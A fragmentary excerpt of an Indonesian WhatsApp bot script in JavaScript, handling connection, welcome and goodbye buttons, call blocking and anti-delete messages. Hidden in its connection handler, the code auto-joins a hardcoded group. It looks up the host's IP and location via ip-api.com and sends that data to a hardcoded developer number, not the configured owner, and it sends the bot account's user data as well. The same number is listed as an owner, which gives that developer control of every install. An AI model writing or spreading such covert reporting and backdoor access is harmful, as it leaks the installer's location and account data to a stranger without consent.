...
pemuda.autoReconnect = ReconnectMode.onConnectionLost
    ...
    pemuda.browserDescription = ['MDz RxNc','Desktop','3.0']
    await sleep(7000)
    pemuda.on('qr', qr => {
 ...
 teks = `https://chat.whatsapp.com/LdkNuInhE85D9g5h1OCOSg`
 pemuda.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Bergabung ke Group WhatsApp !!', 'cyan'))
 pemuda.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(pemuda.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer MDz Vip",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/pemuda.jpg'),sourceUrl:"https://wa.me/6289523767913?text=Hallo%bang"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       pemuda.sendMessage("6289523767913@s.whatsapp.net", `─────「 *SUKSES TERSAMBUNG* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer MDz RxNc",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/pemuda.jpg'),sourceUrl:"https://wa.me/6289523767913?text=Hai%Bot"}}})
...
exec(`cd /sdcard/download && play *mp3`)
   ...
   pemuda.on('chat-update', async (mek) => {
        ...
        ownerNumber = ["6289523767913@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "6289523767913@s.whatsapp.net"
...
pemuda.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
			...
			let buff = await getBuffer(ppimg)
						masuk =`𝘏𝘢𝘭𝘭𝘰👋@${num.split('@')[0]}`
		bumess = [{buttonId: `!000`, buttonText: {displayText: `WELCOME`}, type: 1},{buttonId: `!000`, buttonText: {displayText: `OKE SIAP`}, type: 1}]
			const masukan = {
    contentText: `${masuk}`,
    footerText: `Selamat Datang di › ${mdata.subject}\n\n𝘐𝘯𝘵𝘳𝘰 𝘥𝘶𝘭𝘶 𝘣𝘪𝘢𝘳 𝘱𝘢𝘥𝘢 𝘬𝘦𝘯𝘢𝘭 𝘺𝘢𝘩𝘩📍\n*Nama* :\n*Umur* :\n*Askot* :\n*Alasan gabung* :\n 𝘛𝘩𝘲𝘴 𝘚𝘦𝘮𝘰𝘨𝘢 𝘣𝘦𝘵𝘢𝘩𝘩..📍`,
    buttons: bumess,
    headerType: 1
}
			...
			let buff = await getBuffer(ppimg)
			keluarkan =`*SAYONARA*`
		bumesss = [{buttonId: `!000`, buttonText: {displayText: 'Goodbye‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n\nBalik bawa kawan yahh..'}, type: 1}]
			const Keluarlah = {
    contentText: `${keluarkan}`,
    footerText: `Beban Grup › ${mdata.subject}\nBeban Keluar › @${num.split('@')[0]}`,
    buttons: bumesss,
    headerType: 1
}
			pemuda.sendMessage(mdata.id, Keluarlah, MessageType.buttonsMessage, fs.readFileSync('./media/sampah/pemuda'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('./media/image/script.jpg'), filename:`Tes cok`}, {quoted:m.message, contextInfo: {"mentionedJid": [m.participant]}, forwardingScore: 508, isForwarded: true, externalAdReply:{title:`Download Script`,mediaType:"2",thumbnail:buff,mediaUrl:`https://youtu.be/l8DWicsrW_4`}})
			} else if (anu.action == 'promote') {
fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6289523767913-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6282252509320:6282252509320\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
num = anu.participants[0]
...
console.log(color('|TRM|'), color(`Demote Admin ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
	...
	pemuda.on('group-update', async (anu) => {
    	...
    	const fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6289523767913-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6289523767913:6282252509320\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
...
pemuda.on('CB:action,,call', async json => {
        ...
        pemuda.sendMessage(callerId, "\`\`\`[ ! ] CALL DETECTED [ ! ]\`\`\`\n\n\`\`\`Anda Menelpon Bot Secara Langsung , Silahkan Hubungi Developer Bot Untuk Membuka Block\`\`\`", MessageType.text)
...
pemudadelete = `*「 ANTI HAPUS PESAN 」*
`
button = [{buttonId: `!000`, buttonText: {displayText: 'Oke‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n\nPesan Nya Lain Kali Jangan Di Hapus'}, type: 1}]
const buMess = {
    contentText: `${pemudadelete}`,
    footerText: '› Dari : *@${m.participant.split("@")[0]}\n› Waktu : ${jam}*\n› Tanggal : ${calender}',
    buttons: button,
    headerType: 1
}
...
function doProgress()
{
	...
	if ( progress >= 1 )
	{
		...
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('Bot By MoDz RxNc', 'green'))})}, 200 ) ;
	}
	else
	{
...
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
	    ...
	    }), 'lightgreen')), term.slowTyping('+6289523767913 > MDz RxNc' ,{ flashStyle: term.brightWhite })
